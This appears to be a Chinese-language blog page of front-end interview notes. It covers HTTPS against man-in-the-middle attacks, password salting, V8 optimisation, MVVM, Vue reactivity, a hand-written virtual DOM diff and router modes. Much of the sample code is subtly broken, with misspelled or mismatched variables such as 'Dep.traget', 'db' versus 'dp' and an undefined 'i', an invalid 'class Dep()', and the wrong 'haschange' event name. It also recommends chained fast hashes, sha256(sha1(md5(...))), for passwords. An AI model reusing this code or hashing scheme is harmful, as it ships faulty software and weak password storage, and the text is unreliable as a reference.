当然防御中间人攻击其实并不难，只需要增加一个安全通道来传输信息。HTTPS 就可以用来防御中间人攻击，但是并不是说使用了 HTTPS 就可以高枕无忧了，因为如果你没有完全关闭 HTTP 访问的话，攻击方可以通过某些方式将 HTTPS 降级为 HTTP 从而实现中间人攻击。 密码安全加盐也就是给原来的密码添加字符串，增加原密码的长度 1sha256(sha1(md5(salt+password+salt))) 但是加盐并不能阻止别人盗窃账号，只能确保即使数据库泄露，也不会暴露用户的真实密码。一旦攻击者得到了用户的账号，可以通过暴力破解的方式破解密码。对于这种情况，通常使用验证码增加延时或者限制尝试次数的方式。并且一旦用户输入了错误的密码，也不能直接提示用户输错密码，而是账号或者密码错误 从 V8 中看性能优化测试性能工具：Chrome Audits 以及 Perfomance V8引擎引入了 TurboFan 编译器，会在特定的情况下进行优化，将代码编译成执行效率更高的 Machine Code，当然这个编译器并不是 JS 必须需要的，只是为了提高代码执行性能，所以总的 来说 JS 更偏向于 解释型语言。 123JavaScript Source Code =&gt; [Parser] =&gt; Abstract Syntax Tree =&gt; [interpreter Ignition ] =&gt; [Complier TurboFan] || || ByteCode &lt;= Optimized Machine Code JS 会首先被解析为 AST ，解析过程比较慢，代码越多，解析的过程也就耗费越长，这也是我们为什么要压缩代码的原因。另外一个减少解析时间的方式是预解析，作用于未执行的函数。另外尽可能避免嵌套函数声明，可以避免重复解析。 Ignition 负责将 AST 转换为 Bytecode ,然后 TurboFan 负责编译优化后的 Machine Code，并 Machine Code 在执行效率上优于 Bytecode. JS 是一门动态类型的语言，而且有一堆的规则，简单的加法运算代码，内容就要考虑好几种规则，比如数字相加、字符串相加、对象和字符串等等。这种情况就会导致内部要增加很多判断逻辑，降低运行效率。 如果固定了类型，就不需要执行很多判断逻辑，代码可以编译为 Machine Code。ts 的好处？ 如果我们一旦传入的参数类型改变，那么 Machine Code 就会被 DeOptimized 为 ByteCode，这样就有性能上的一个损耗。所以我们如果希望diam能多的编译为 Machine Code 并且 DeOptimized 的次数减少，就应该尽可能保证传入的类型一致。 框架通识MVVM(View+Model+ViewModel)传统的 MVC 架构通常是使用控制器更新模型，视图从模型中获取数据去渲染，当有用户输入的时候，会通过控制器去更新模型，并且通知视图进行更新，但是 MVC 架构的一个巨大的缺项就是控制承担的责任太大了，随着项目的愈加复杂，控制器中的代码会越来越臃肿，导致出现不利于维护的情况。 MVVM 由三个内容组成： View：界面 Model：数据模型 ViewModel：作为桥梁负责沟通 View 和 Model 在 JQuery 时期，如果需要刷新 UI 时，需要先取到对应的 DOM 再更新 UI，这样数据和业务的逻辑就和页面有强耦合。 ViewModel 只关心数据和业务的处理，不关心 View 是怎么处理数据的，这种情况下，View 和 Model 都可以独立出来，任何一方改变了也不一定需要改变另一方，并且可以将一些复用的逻辑放在一个 ViewModel 中，让多个 View 复用这个 ViewModel。以 Vue 框架为例子，ViewModel 就是组件的实例，View 就是模板，Model 在引入了 Vuex 的情况下是完全可以和组件分离的。在 MVVM 中还引入了一个隐式的 Binder 层，实现了 View 和 ViewModel 的绑定，在Vue 中，这个隐式的 Binder 层就是Vue 通过解析模板中的插值和指令从而实现 View 和 ViewModel 的绑定。 在 MVVM 中，最核心的也就是数据双向绑定，例如 Angluar 的脏数据检测，Vue 中的数据劫持。 脏数据监测当触发了指定事件后会进入脏数据检测，这时会调用 $digest 循环遍历所有的数据观察者，判断当前值是否和先前的值有区别，如果检测到变化的话，会调用 $watch 函数，然后再次调用 $digest 循环直到发现没有变化。循环至少为二次 ，至多为十次。 脏数据检测虽然存在低效的问题，但是不关心数据是通过什么方式改变的，都可以完成任务，但是这在 Vue 中的双向绑定是存在问题的。并且脏数据检测可以实现批量检测出更新的值，再去统一更新 UI，大大减少了操作 DOM 的次数。所以低效也是相对的，这就仁者见仁智者见智了。 数据劫持Vue 内部使用了 Object.defineProperty() 来实现双向绑定，通过这个函数可以监听到 set 和 get 的事件。 1234567891011121314151617181920212223242526272829var data = &#123;name:'yck'&#125;observe(data)let name = data.namedata.name = 'yyy'function observe(obj)&#123; if(!obj || typeof obj !== 'object')&#123; return &#125; Object.keys(obj).forEach(key=&gt;&#123; defineReactive(obj,key,obj[key]); &#125;)&#125;function defineReactive(obj,key,val)&#123; // 递归子属性 observe(val); Object.defineProperty(obj,key,&#123; enumerable:true, configurable:true, get:function rectiveGetter()&#123; console.log('get value'); return val; &#125;, set:function rectiveSetter(newVal)&#123; console.log('change value'); val = newVal; &#125; &#125;);&#125; 以上代码简单的实现了如何监听数据的 set 和 get 的事件，但是仅仅如此是不够的，还需要在适当的时候给属性添加发布订阅 1&lt;div&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; 在解析如上模板代码时，遇到 就会给属性 name 添加发布订阅。 123456789101112131415161718192021222324252627282930313233343536373839404142434445// 通过Dep 解耦class Dep()&#123; constructor()&#123; this.subs = [] &#125; addSub(sub)&#123; // sub 是 Watcher 实例 this.subs.push(sub) &#125; notify()&#123; this.subs.forEach(sub=&gt;&#123; sub.update() &#125;) &#125; &#125;// 全局属性，通过该属性配置 WatcherDep.target = null;function update(value)&#123; document.querySelector('div').innerText = value;&#125;class Watcher&#123; constructor(obj,key,cb)&#123; // Dep.target 指向自己，然后触发属性的 getter 添加监听，最后将 Dep.target 置空 Dep.target = this; this.cb = cb; this.key = key; this.obj = obj; this.value = obj[key] Dep.target = null &#125; update()&#123; // 获得新值 this.value = this.obj[this.key]; // 调用 update 方法更新 dom this.cb(this.value); &#125;&#125;var data = &#123;name:'yck'&#125;observe(data)// 模拟解析到 &#123;&#123;name&#125;&#125; 触发的操作new Watcher(data,'name',update)// update dom innerHtmldata.name = 'yyy' 接下来,对 defineReactive 函数进行改造 1234567891011121314151617181920212223function defineReactive(obj,key,val)&#123; // 递归子属性 observe(val) let db = new Dep(); Object.defineProperty(obj,key,&#123; enumerable:true, configurable:true, get:function reactiveGetter()&#123; console.log('get value'); // 将 Watcher 添加到 订阅 if(Dep.traget)&#123; dp.addSub(Dep.target) &#125; return val; &#125;, set:function reactiveSetter(newVal)&#123; console.log('change value'); val = newVal; // 执行 watcher 的 update 方法 dp.notify(); &#125; &#125;)&#125; 以上实现了一个简易的双向绑定，核心思路就是手动触发一次属性的 getter 来实现发布订阅的添加。 Proxy 与 Object.defineProperty 对比Object.defineProperty 虽然已经能够实现双向绑定了，但是他还是有缺陷的。 只能对属性进行数据劫持，所以需要深度遍历整个对象 对于数组不能监听到数据的变化 虽然 Vue 中确实能检测到数组数据的变化，但是其实是使用了 hack 的办法，并且也是有缺陷的。 1234567891011121314151617181920212223242526272829303132333435const arrayProto = Array.prototypeexport const arrayMethods = Object.create(arrayProto)// hack 以下几个函数const methodsToPatch = [ 'push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse']methodsToPatch.forEach(function(method) &#123; // 获得原生函数 const original = arrayProto[method] def(arrayMethods, method, function mutator(...args) &#123; // 调用原生函数 const result = original.apply(this, args) const ob = this.__ob__ let inserted switch (method) &#123; case 'push': case 'unshift': inserted = args break case 'splice': inserted = args.slice(2) break &#125; if (inserted) ob.observeArray(inserted) // 触发更新 ob.dep.notify() return result &#125;)&#125;) 反观 Proxy 就没以上的问题，原生支持监听数组变化，并且可以直接对整个对象进行拦截，所以 Vue 也将在下个大版本中使用 Proxy 替换 Object.defineProperty 123456789101112131415161718192021222324252627let onWatch = (obj, setBind, getLogger) =&gt; &#123; let handler = &#123; get(target, property, receiver) &#123; getLogger(target, property) return Reflect.get(target, property, receiver) &#125;, set(target, property, value, receiver) &#123; setBind(value) return Reflect.set(target, property, value) &#125; &#125; return new Proxy(obj, handler)&#125;let obj = &#123; a: 1 &#125;let valuelet p = onWatch( obj, v =&gt; &#123; value = v &#125;, (target, property) =&gt; &#123; console.log(`Get '$&#123;property&#125;' = $&#123;target[property]&#125;`) &#125;)p.a = 2 // bind `value` to `2`p.a // -&gt; Get 'a' = 2 路由原理前端路由实现起来其实很简单，本质就是监听 URL 的变化，然后匹配路由规则，显示相应的页面，并且无须刷新。目前单页面使用的路由就只有两种实现方式 hash 模式 history 模式 www.text.com/##/ 就是 Hash URL ，当 ## 后面的 哈希值发生变化的时候，不会向服务器请求数据，可以通过 hashchaneg 事件来监听到 URL 的变化，从而进行跳转页面。 History 模式是 HTML5 新推出的功能，比之 Hash URL 更加美观 Virtual Dom为什么需要 Virtual Dom操作 DOM 是一件很耗费性能的事情，可以通过 JS 对象来模拟 DOM 对象。 123456789101112131415const ul = &#123; tag:'ul', props:&#123; class:'list' &#125;, children:&#123; tag:'li', children:'1' &#125;&#125;// 相当于/** &lt;ul class='list'&gt; &lt;li&gt;1&lt;/li&gt;&lt;/ul&gt;*/ 例子： 12345// 假设这里模拟一个 ul，其中包含了 5 个 li;[1, 2, 3, 4, 5][ // 这里替换上面的 li (1, 2, 5, 4)] 从上述例子中，我们一眼就可以看出先前的 ul 中的第三个 li 被移除了，四五替换了位置。 如果以上操作对应到 DOM 中，那么就是以下代码 123456789// 删除第三个 liul.childNodes[2].remove()// 将第四个 li 和第五个交换位置let fromNode = ul.childNodes[4]let toNode = node.childNodes[3]let cloneFromNode = fromNode.cloneNode(true)let cloenToNode = toNode.cloneNode(true)ul.replaceChild(cloneFromNode, toNode)ul.replaceChild(cloenToNode, fromNode) 当然在实际操作中，我们还需要给每个节点一个标识，作为判断是同一个节点的依据。所以这也是 Vue 和 React 中官方推荐列表里的节点使用唯一的 key 来保证性能。 那么既然 DOM 对象可以通过 JS 对象来模拟，反之也可以通过 JS 对象来渲染出对应的 DOM 以下是一个 JS 对象模拟 DOM 对象的简单实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566export default class Element &#123; /** * @param &#123;String&#125; tag 'div' * @param &#123;Object&#125; props &#123;class:'item'&#125; * @param &#123;Array&#125; child [Element1,'text] * @param &#123;String&#125; key option */ constructor(tag, props, children, key) &#123; this.tag = tag; this.props = props; if (Array.isArray(children)) &#123; this.children = children; &#125; else if (isString(children)) &#123; this.key = children; this.children = null &#125; if (key) this.key = key; &#125; // 渲染 render() &#123; let root = this._createElement( this.tag, this.props, this.children, this.key ) document.body.appendChild(root) return root; &#125; create() &#123; return this._createElement(this.tag, this.props, this.children, this.key) &#125; // 创建节点 _createElement(tag, props, child, key) &#123; // 通过 tag 创建节点 let el = document.createElement(tag); // 设置节点属性 for (const key in props) &#123; if (props.hasOwnProperty(key)) &#123; const value = props[key]; el.setAttribute(key, value); &#125; &#125; if (key) &#123; el.setAttribute('key', key) &#125; // 递归添加子节点 if (child) &#123; child.forEach(elememt =&gt; &#123; let child; if (element instanceof Element) &#123; child = this._createElement( elememt.tag, elememt.props, elememt.children, elememt.key ) &#125; else &#123; child = document.createTextNode(elememt) &#125; el.appendChild(child) &#125;); &#125; return el; &#125;&#125; Virtual Dom 算法简述DOM 是多叉树结构，如果需要完整的对比两棵树的差异，那么需要的时间复杂度是 O(n ^ 3)。React 团队优化了算法，实现了 O(n) 的复杂度来对比差异。 关键在于只是对比同层的节点，而不是跨层对比，这也是考虑到在实际业务中很少回去跨层移动 DOM 元素。 判断差异算法分成了两步 首先从上到下，从左到右遍历对象，要就是树的深度遍历，这一步会给每个节点添加索引，便于后面渲染差异 一旦节点有子元素，就去判断子元素是否有不同 Virtual Dom 算法实现树的递归 首先实现树的递归遍历，在实现该算法前，考虑两个节点对比出现的几种情况： 新的节点 tagName 或者 key 和旧的不同，这种情况代表需要替换旧的节点，并也不再需要遍历新旧子元素了，因为整个旧节点都被删除掉了。 新的节点的 tagName 和 key （可能都没有）和旧的相同，开始遍历子树 没有新的节点，那么什么都不用做 123456789101112131415161718192021222324252627282930313233343536import &#123; StateEnums, isString, move &#125; from './util'import Element from './element'export default function diff(oldDomTree, newDomTree) &#123; // 用于记录差异 let pathchs = &#123;&#125;; // 一开始的索引为0 dfs(oldDomTree, newDomTree, 0, pathchs) return pathchs&#125;function dfs(oldNode, newNode, index, patches) &#123; // 用于保存子树的更改 let curPatches = []; // 需要判断三种情况： // 1.没有新的节点，那么什么都不做 // 2.新的节点的 tagName 和 key（可能都没有）和旧的相同，开始遍历子树 // 3.没有新的节点，那么什么都不用做 if (!newNode) &#123; &#125; else if (newNode.tag === oldNode.tag &amp;&amp; newNode.key === oldNode.key) &#123; // 判断属性是否变更 let props = diffProps(oldNode.props, newNode.props) if (props.length) curPatches.push(&#123; type: StateEnums.ChangeProps, props &#125;) // 遍历子树 diffChildren(oldNode.children, newNode.children, index, patches) &#125; else &#123; // 节点不同，需要替换 curPatches.push(&#123; type: StateEnums.Replace, node: newNode &#125;) &#125; if (curPatches.length) &#123; if (patches[index]) &#123; patches[index] = patches[index].concat(curPatches) &#125; else &#123; patches[index] = curPatches; &#125; &#125;&#125; 判断属性的更改 判断属性的更改也分成三个步骤 遍历旧的属性列表，查看每个属性是否还存在于新的属性列表中 遍历新的属性列表，判断两个列表中都存在的属性的值是否存在变化 在第二步中同时查看是否有属性不存在与旧的属性列列表中 12345678910111213141516171819202122232425function diffProps(oldProps, newProps) &#123; let change = []; for (const key in oldProps) &#123; if (oldProps.hasOwnProperty(key) &amp;&amp; !newProps[key]) &#123; change.push(&#123; prop: key &#125;) &#125; &#125; for (const key in newProps) &#123; if (newProps.hasOwnProperty(key)) &#123; const prop = newProps[key]; if (oldProps[key] &amp;&amp; oldProps[key] !== newProps[key]) &#123; change.push(&#123; prop: key, value: newProps[key] &#125;) &#125; else if (!oldProps[key]) &#123; change.push(&#123; prop: key, value: newProps[key] &#125;) &#125; &#125; &#125; return change;&#125; 判断列表差异算法实现 整个 Virtual Dom 中最核心的算法，这里的主要步骤其实和判断属性差异是类似的，也是分成三个步骤： 遍历旧的节点列表，查看每个节点是否还存在新的节点列表中 遍历新的节点列表，判断是否有新的节点 在第二步中同时判断节点是否有移动 该算法只对有 key 的节点做处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function listDiff(oldList, newList, index, patches) &#123; // 为了遍历方便，先取出两个 list 中所有的 keys let oldKeys = getKeys(oldList); let newKeys = getKeys(newList); let changes = []; // 用于保存变更后的节点数据，使用该数组保存有以下好处， // 1.可以正确获取被删除节点索引 // 2.交换位置只需要操作一遍 dom // 3.用于 diffChildren 函数中的判断，只需要遍历 // 两个树中都存在的节点，对于新增或者删除的节点来说，完全没有必要再去判断一次 let list = []; oldList &amp;&amp; oldList.forEach(item =&gt; &#123; let key = item.key; if (isString(item)) &#123; key = item &#125; // 寻找新的 children 中是否含有当前节点，没有的话需要删除 let index = newKeys.indexOf(key); if (index === -1) &#123; list.push(null); &#125; else &#123; list.push(key) &#125; &#125;) // 遍历变更后的数组 let length = list.length; // 因为删除数组元素是会更改索引的，所以从后往前删可以保证索引不变 for (let i = length - 1; i &gt;= 0; i--) &#123; // 判断当前元素是否为空，为空则表示要删除 if (!list[i]) &#123; list.splice(i, 1) changes.push(&#123; type: StateEnums.Remove, index: i &#125;); &#125; &#125; // 遍历新的list 判断是否节点新增或者是移动，同时也对 list 做节点的新增或者是移动 newList &amp;&amp; newList.forEach(item =&gt; &#123; let key = item.key; if (isString(item)) &#123; key = item &#125; // 寻找旧的 children 中是否含有当前节点，没有的话需要插入 let index = list.indexOf(key); if (index === -1 || index == null) &#123; changes.push(&#123; type: StateEnums.Insert, node: item, index: i &#125;); list.splice(i, 0, key) &#125; else &#123; // 找到了，需要判断是否需要移动 if (index !== i) &#123; changes.push(&#123; type: StateEnums.Move, from: index, to: i &#125;); move(list, index, i) &#125; &#125; &#125;) return &#123; changes, list &#125;&#125;function getKeys(list) &#123; let keys = []; let text; list &amp;&amp; list.forEach(item =&gt; &#123; let key; if (isString(item)) &#123; key = [item] &#125; else if (item instanceof Element) &#123; key = item.key; &#125; keys.push(key) &#125;) return keys&#125; 遍历子元素打标识 对于整个函数来说，主要的功能就两个 判断两个列表差异 给节点打上标记 总体来说，该函数的实现很简单 123456789101112131415161718192021222324252627function diffChildren(oldChild, newChild, index, patches) &#123; let &#123; changes, list &#125; = listDiff(oldChild, newChild, index, patches) if (changes.length) &#123; if (patches[index]) &#123; patches[index] = patches[index].concat(changes) &#125; else &#123; patches[index] = changes; &#125; &#125; // 记录上一次遍历过的节点 let last = null; oldChild &amp;&amp; oldChild.forEach((item, i) =&gt; &#123; let child = item &amp;&amp; item.children; if (child) &#123; index = last &amp;&amp; last.children ? index + last.children.length + 1 : index + 1 let keyIndex = list.indexOf(item.key); let node = newChild[keyIndex]; // 只遍历新旧节点都存在的节点，其他新增或者删除的没有必要遍历 if (node) &#123; dfs(item, node, index, patches) &#125; &#125; else &#123; index += 1 &#125; last = item; &#125;)&#125; 渲染差异 通过之前的算法，我们已经可以得出两个树的差异了。既然知道了差异，就需要局部去更新 DOM 了，下面就让我们来看看 Virtual Dom 算法的最后一步骤 这个函数主要两个功能 深度遍历树，将需要做变更操作的取出来 局部更新 DOM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263let index = 0export default function patch(node, patchs) &#123; let changes = patchs[index] let childNodes = node &amp;&amp; node.childNodes // 这里的深度遍历和 diff 中是一样的 if (!childNodes) index += 1 if (changes &amp;&amp; changes.length &amp;&amp; patchs[index]) &#123; changeDom(node, changes) &#125; let last = null if (childNodes &amp;&amp; childNodes.length) &#123; childNodes.forEach((item, i) =&gt; &#123; index = last &amp;&amp; last.children ? index + last.children.length + 1 : index + 1 patch(item, patchs) last = item &#125;) &#125;&#125;function changeDom(node, changes, noChild) &#123; changes &amp;&amp; changes.forEach(change =&gt; &#123; let &#123; type &#125; = change switch (type) &#123; case StateEnums.ChangeProps: let &#123; props &#125; = change props.forEach(item =&gt; &#123; if (item.value) &#123; node.setAttribute(item.prop, item.value) &#125; else &#123; node.removeAttribute(item.prop) &#125; &#125;) break case StateEnums.Remove: node.childNodes[change.index].remove() break case StateEnums.Insert: let dom if (isString(change.node)) &#123; dom = document.createTextNode(change.node) &#125; else if (change.node instanceof Element) &#123; dom = change.node.create() &#125; node.insertBefore(dom, node.childNodes[change.index]) break case StateEnums.Replace: node.parentNode.replaceChild(change.node.create(), node) break case StateEnums.Move: let fromNode = node.childNodes[change.from] let toNode = node.childNodes[change.to] let cloneFromNode = fromNode.cloneNode(true) let cloenToNode = toNode.cloneNode(true) node.replaceChild(cloneFromNode, toNode) node.replaceChild(cloenToNode, fromNode) break default: break &#125; &#125;)&#125; 最后Virtul Dom 算法的实现也是下面三个步骤： 通过JS 来模拟创建 DOM 对象 判断两个对象的差异 渲染差异 1234567891011121314151617let test4 = new Element('div', &#123; class: 'my-div' &#125;, ['test4'])let test5 = new Element('ul', &#123; class: 'my-div' &#125;, ['test5'])let test1 = new Element('div', &#123; class: 'my-div' &#125;, [test4])let test2 = new Element('div', &#123; id: '11' &#125;, [test5, test4])let root = test1.render()let pathchs = diff(test1, test2)console.log(pathchs)setTimeout(() =&gt; &#123; console.log('开始更新') patch(root, pathchs) console.log('结束更新')&#125;, 1000) 路由模式涉及的面试题目：前端路由原理，两种实现方式有什么区别？ 前端路由实现起来不难，本质就是监听 URL 的变化，然后匹配路由规则，显示对应的页面，并且无须刷新页面，目前前端使用的路由大概有两种方式： hash 模式 History 模式 Hashwww.test.com/#/ 就是 Hash URL，当 # 后面的哈希值发生变化时，可以通过 hashchange 事件来监听到 URL 的变化，从而进行跳转页面，并且无论哈希值如何变化，服务端接收到的 URL 请求永远是 www.test.com。 123window.addEventListener('haschange',()=&gt;&#123; // 具体逻辑...&#125;); Hash 模式相对简单，并且兼容性更好 HistoryHistory 模式 是 HTML5 推出的新功能，主要使用 history.pushState 和 history.replaceState 改变 URL。 通过 History 模式改变 URL 同样不会引起浏览器的刷新，只会更新浏览器的历史记录 1234// 新增历史记录history.pushState(stateObj,title,URL);// 替换当前的历史记录history.replaceState(stateObj,title,URL); 当用户做出浏览器动作的时候，比如点击后退按钮会触发 popState 事件 1234window.addEventListener('popstate',e=&gt;&#123; // e.state 就是 push(stateObject) 中的 stateObject console.log(e.state);&#125;); 两种模式对比 Hash 模式只可以更改 # 号后面的内容。History 模式可以通过 API 设置任意的同源的 URL History 模式可以通过 API 添加任意的数据到历史记录中，Hash 模式只能更改哈希值，也就是字符串 Hash 模式无需后置配置，并且兼容性好。History 模式在用户输入地址或者刷新页面的时候会发起 URL 请求，后端需要配置 index.html 用于匹配不到静态资源的时候 Vue 常考的基本知识点声明周期钩子函数在 beforeCreate 钩子函数使用的时候，是获取不到 props 或者 data中的数据的，因为这些数据都在 initState 中 然后会执行 created 钩子函数，这一步可以访问到之前不能访问到的数据，但是这时候，组件还没有被挂载。 beforeMount 钩子函数，开始构建 VDOM，最后执行 mounted 钩子函数，并将 VDOM 渲染为真实的 DOM 并且渲染数据。组件中如果有子组件的话，会递归挂载子组件，只有当所有组件全部挂载完毕，才会执行根组件的挂载钩子。 数据更新时会调用钩子函数 beforeUpdate 和 updated ，分别是在数据更新前后会调用 keep-alive 独有的生命周期，activated 和 deactivated。用 keep-alive 包裹的组件切换时不会进行销毁，而是缓存到内存中并执行 deactivated 钩子函数,命中缓存渲染后会执行 atived 钩子函数 最后就是销毁组件的钩子函数 beforeDestory 和 destroyed .前者适合移除事件、定时器等等，否则可能会引起内存泄露的问题，然后进行一系列的销操作，如果有子组件的话，也会递归销毁子组件，所有子组件都销毁完毕之后才会执行根组件的 destroyed 钩子函数 组件通信一般有一下几种情况 父子组件 兄弟组件 跨多层次组件 任意组件 父子组件通信父组件通过 props 传递给子组件，子组件通过 emit 发送事件传递数据给父组件，这两种方式是常用的父子通信实现方法 这种父子组件就是典型的单向数据流，父组件通过 props 传递数据，子组件不能直接修改 props,而是必须通过发送事件的方式告知父组件修改数据。 另外这两种方式还可以使用语法糖 v-model 来直接实现，因为 v-model 会解析成名为 value 的 prop 和 input 的事件。这种语法糖的方式是典型的双向绑定，常用于 UI控件上面，但是根本上还是通过事件的方法来让父组件修改数据。 还可以通过 \$parent 或者是 \$children 对象来访问组件实例中方法和数据。 另外使用 Vue2.3 以上的版本还可以使用 \$ listeners 和 .sycn 两个属性 \$ listeners 属性会将父组件中（不含 .native 修饰器的）v-on 事件监听器传递给子组件，子组件可以通过访问 \$listeners 来自定义监听器 .sync 属性是语法糖，可以很简单实现子组件和父组件的通信 12345678&lt;!--父组件中---&gt;&lt;input :value.sync=&quot;value&quot;&gt;&lt;!--上面写法等同于--&gt;&lt;input :value=&quot;value&quot; @update:value=&quot;v=&gt;value=v&quot;&gt;&lt;/comp&gt;&lt;!--子组件中--&gt;&lt;script&gt; this.$emit(&apos;update:value&apos;,1)&lt;/script&gt; 兄弟组件通信可以通过查找父组件中的子组件的实现，就是 this.$parent.$children 在 $children中可以通过 name 查询到需要的组件实例，然后进行通信 跨多层组件通信可以使用 Vue2.2 新增的 API provide/inject ，虽然在文档中不支持使用在业务中，但是如果用得好的话还是有用的 假设有父组件 A 然后有一个跨多层级的子组件B 1234567891011121314// 父组件Aexport default&#123; provide:&#123; data:1 &#125;&#125;// 子组件 Bexport default &#123; inject:['data'], mounted()&#123; // 无论跨几层都能获取到父组件的 data 属性 console.log(this.data); //=&gt;1 &#125;&#125; 任意组件这种方式可以通过 Vuex 或者 Event Bus 解决，另外如果不怕麻烦的话，可以使用这种方式来解决上述的所有通信情况 extend 能做什么作用是扩展㢟生成一个构造器，通常会与 $mount一起使用 1234567891011121314// 创建组件构造器let Component = Vue.extend(&#123; template:'&lt;div&gt;test&lt;/div&gt;'&#125;)// 挂载到 #app 上new.Component().$mount('#app');// 除了上面方式还可以来扩展原来的组件let SuperComponent = Vue.extend(Component)new SuperComponent(&#123; created()&#123; console.log(1); &#125;&#125;)new SuperComponent().$mount('#app') mixin 和 mixins 的区别mixin 用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的 12345Vue.mixin(&#123; beforeCreate()&#123; // 逻辑，这种方式会影响到所有组件的 beforeCreate 钩子函数 &#125;&#125;) 文档不建议直接在应用中使用 mixin ，但是不滥用的话，可以全局混入装好的 ajax 或者一些工具函数等等 mixins 应该是我们最常使用的扩展组件的方式了，如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过 mixins 混入代码，比如上拉下拉加载数据这种等等。 另外要注意的是 mixins 混入的钩子函数会先于组件的钩子函数执行，并且在晕倒同名选项的时候也会有选择性的进行合并。 computed 和 watch 的区别computed 是计算属性，依赖其他属性来计算，并且 computed 的值有缓存，只有当值变化才会返回内容。 watch 监听到值的变化就会执行回调，在回调中可以进行一些逻辑操作。 所以一般来说需要依赖别的属性来动态获得值的时候就可以使用 computed ，对于监听到值的变化需要做的一些复杂业务逻辑的时候可以使用 watch 另外这两者都支持对象的写法： 123456789101112131415161718192021222324vm.$watch('obj',&#123; // 深度遍历 deep:true, // 立即触发 immediate:true, // 执行函数 handler:function(val,oldVal)&#123;&#125;&#125;)var vm = new Vue(&#123; data:&#123;a:1&#125;, computed:&#123; aPlus:&#123; // this.aPlus 的时候触发 get:function()&#123; return this.a + 1 &#125;, // this.aPlus = 1时触发 set:function(v)&#123; this.a = v - 1 &#125; &#125; &#125;&#125;) keep-alive组件的作用需要需要在组件切换时，保存一些组件的状态防止多次渲染，可以使用 keep-alive 组件包裹需要保存的组件 对于 keep-alive 组件来说，它拥有两个独有的声明周期函数，分别是 activated 和 deactivated ，用 keep-alive 包裹的组件在切换时不会进行销毁，而是缓存到内存中并执行 deactivated 钩子函数，命中缓存渲染后会执行 actived 钩子函数 v-show 和 v-if 的区别v-show 只是在 display：none 和 display：block 之间切换。无论初始条件是什么都会被渲染出来，后面只需要切换 CSS，DOM 还是一直保留的，所以总的来说，v-show 在初始渲染有更高的开销，但是切换开销小，更适合于频繁切换的场景 v-if 的话就涉及 Vue 底层的编译，当属性初始为 false，组件就不会被渲染，直到条件为 true，并且切换条件时会触发销毁/挂载组件，所以总的来说在切换开销更高，更适合不经常切换的场景，并且基于 v-if 的这种惰性渲染机制，可以在必要的时候才去渲染组件，减少整个页面的初始渲染开销。 组件中 data 什么时候可以使用对象组件复用时所有的实例都会共享 data ，如果data 是对象的话，就会造成一个组件修改 data 之后会影响到其他所有的组件，所以我们需要将 data 写成函数，每次用到就调用一次函数来获得新的数据 当我们使用 new Vue() 的方式的时候，无论我们将 data 设置为对象还是函数都是可以的，因为 new Vue（） 的方式是生成一个根组件，也就不存在共享 data 的情况了。 进阶知识点响应式原理Vue 内部使用了 Object.defineProperty() 来实现数据响应式，通过函数可以监听到 set 和 get 事件 12345678910111213141516171819202122232425262728293031323334const data = &#123; name: 'lbh' &#125;observe(data);let &#123; name &#125; = data;data.name = 'haha'; function observe(obj) &#123; // 判断类型 if (!obj || typeof obj !== 'object') &#123; return &#125; Object.keys(obj).forEach(key =&gt; &#123; defineReactive(obj, key, obj[key]) &#125;) &#125;function defineReactive(obj, key, val) &#123; // 递归子属性 observe(val); Object.defineProperty(obj, key, &#123; // 可枚举 enumerable: true, // 可配置 configurable: true, // 自定义函数 get: function reactiveGetter() &#123; console.log('get val'); return val; &#125;, set: function reactiveSetter(newVal) &#123; console.log('change val'); val = newVal; &#125; &#125;)&#125; 上面代码简单实现了如何监听数据的 set 和 get 事件，因为自定义函数一开始是不会执行的，只有先执行了依赖收集，才能在属性更新的时候派发更新，所以我们接下来需要先触发依赖收集 123&lt;div&gt; &#123;&#123;name&#125;&#125;&lt;/div&gt; 在解析上面的模板代码时候，会遇到 就会进行依赖收集 实现一个 Dep 类，用于解耦属性的依赖收集和派发更新操作 1234567891011121314151617class Dep &#123; constructor() &#123; this.subs = [] &#125; // 添加依赖 addSub(sub) &#123; this.subs.push(sub) &#125; // 更新 notify() &#123; this.subs.forEach(sub =&gt; &#123; sub.update(); &#125;) &#125;&#125;// 全局属性，通过该属性配置 watcherDep.target = null; 当需要收集依赖的时候调用 addSub,当需要派发更新的时候调用 notify() 下面简单了解 Vue 组件挂载时添加响应式的过程。在组件挂载时，会先对所有需要的属性调用 Object.defineProperty(),然后实例化 Watcher，传入组件更新的回调，在实例化中，会对模板中的属性进行求值，触发依赖收集。 1234567891011121314151617class Watcher &#123; constructor(obj, key, cb) &#123; // 将 Dep.target 指向自己，然后出发属性的 getter 添加监听，最后将 Dep.target 置空 Dep.target = this; this.cb = cb; this.obj = obj; this.key = key; this.value = obj[value]; Dep.target = null; &#125; update() &#123; // 获得新值 this.value = this.obj[this.key]; // 调用 update 方法更新 Dom this.cb(this.value); &#125;&#125; 上面是 Wathcer 的简单实现，在执行构造函数的时候将 Dep.target 指向自身，从而使得收集到了对应的 Watcher,在派发更新的时候取出对应的 Watcher 然后执行 update 函数 接下来，需要对 defineReactive 函数进行改造，在自定义函数中添加依赖收集和派发更新相关的代码： 1234567891011121314151617181920212223242526function defineReactive(obj, key, val) &#123; // 递归子属性 observe(val); let dp = new Dep(); Object.defineProperty(obj, key, &#123; // 可枚举 enumerable: true, // 可配置 configurable: true, // 自定义函数 get: function reactiveGetter() &#123; console.log('get val'); // 将Watcher 添加到订阅中 if (Dep.target) &#123; dp.addSub(Dep.target) &#125; return val; &#125;, set: function reactiveSetter(newVal) &#123; console.log('change val'); val = newVal; // 执行 watcher 的 update 方法 dp.notify(); &#125; &#125;)&#125; 上面的代码实现了一个简易的数据响应式，核心思路就是手动触发一次属性的 getter 来实现依赖收集。 测试： 123456789101112var data = &#123; name: 'lbh' &#125;observe(data)function update(value) &#123; document.querySelector('div').innerText = value&#125;// 模拟解析到 `&#123;&#123;name&#125;&#125;` 触发的操作new Watcher(data, 'name', update)// update Dom innerTextdata.name = 'haha' // get val// change val// get val Object.defineProperty 的缺陷如果通过下标的方式修改数据或者给对象新增属性并不会触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作，更精确的来说，对于数组来说，大部分操作都是拦截不到的，只是 vue 